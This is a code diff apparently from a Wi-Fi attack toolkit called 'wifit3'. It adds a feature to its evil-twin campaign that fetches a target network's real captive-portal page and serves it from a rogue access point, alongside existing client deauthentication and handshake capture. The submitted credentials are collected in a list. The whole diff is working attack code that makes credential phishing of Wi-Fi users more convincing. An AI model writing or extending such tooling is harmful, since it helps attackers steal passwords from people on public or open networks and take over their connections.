@@ -18,6 +18,7 @@ from wifit3.crack.handshake import crackable_pairs, pmkid_crackable
 from wifit3.campaigns.campaign import Campaign
 from wifit3.campaigns.eviltwin.fake_ap import FakeAP, ClientPhase
 from wifit3.campaigns.eviltwin.portal import PortalStack
+from wifit3.campaigns.eviltwin.portal_fetch import fetch_real_portal
 from wifit3.campaigns.eviltwin.punter import Punter, PuntMode, BURST_SIZE, FRAME_GAP_SEC
 from wifit3.net.portal_templates import PortalTemplate
 
@@ -58,6 +59,7 @@ class EvilTwinInput:
     target_client: Optional[str] = None      # None = every client on the target; else steer/deauth just this MAC
     ip_layer: bool = False                   # open targets only: bring up the TAP+DHCP+DNS+HTTP stack
     portal_template: PortalTemplate = PortalTemplate.PASSWORD
+    clone_real_portal: bool = False          # dual-card + ip_layer only: fetch the target's actual page
 
 
 class EvilTwinCampaign(Campaign):
@@ -97,6 +99,11 @@ class EvilTwinCampaign(Campaign):
         self.target_client = (evil_input.target_client or "").lower() or None
         self._ip_layer_enabled = evil_input.ip_layer
         self.portal_template = evil_input.portal_template
+        self._clone_real_portal = evil_input.clone_real_portal
+        self.cloned_real_portal = False
+        self.portal_fetch_error: Optional[str] = None
+        self._fetched_page: Optional[str] = None
+        self.fetching_real_portal = False   # True only while the fetch is actually in flight
         self.real_beacon = target.last_beacon_frame
         self.twin_beacon = beacon_clone(self.real_beacon, self.twin_channel,
                                         None if self.same_bssid else str_to_mac(self.twin_bssid))
@@ -116,6 +123,17 @@ class EvilTwinCampaign(Campaign):
                       str_to_mac(self.twin_bssid), self.twin_channel, self.target_channel)
 
     async def _loop(self) -> None:
+        if self._should_clone_real_portal():
+            self.fetching_real_portal = True
+            try:
+                self._fetched_page = await fetch_real_portal(
+                    self.array, self.punt_iface, self.ap.bssid, self.ssid, self.target_channel)
+            finally:
+                self.fetching_real_portal = False
+            if self._fetched_page is not None:
+                self.cloned_real_portal = True
+            else:
+                self.portal_fetch_error = "couldn't clone the real portal; using the template instead"
         self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
                              self.twin_channel, self.twin_beacon, rx_source=self.twin_iface,
                              record_m1=self.array.record_injected_eapol, secured=self.secured,
@@ -173,6 +191,10 @@ class EvilTwinCampaign(Campaign):
                 return True
         return False
 
+    def _should_clone_real_portal(self) -> bool:
+        return (self._clone_real_portal and self._ip_layer_enabled and not self.secured
+               and self.punt_iface is not self.twin_iface)
+
     def _note_open_joins(self) -> None:
         """Open twin: a joined client must stay associated, so this is never a stop signal, just
         something the UI reads back."""
@@ -187,7 +209,8 @@ class EvilTwinCampaign(Campaign):
             self.ip_layer_error = "no IP layer yet on this platform (Linux only for now)"
             return
         stack = PortalStack(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
-                            template=self.portal_template, on_submit=self.portal_submissions.append)
+                            template=self.portal_template, on_submit=self.portal_submissions.append,
+                            page_override=self._fetched_page)
         try:
             await stack.start()
         except Exception as exc:                                    # noqa: BLE001
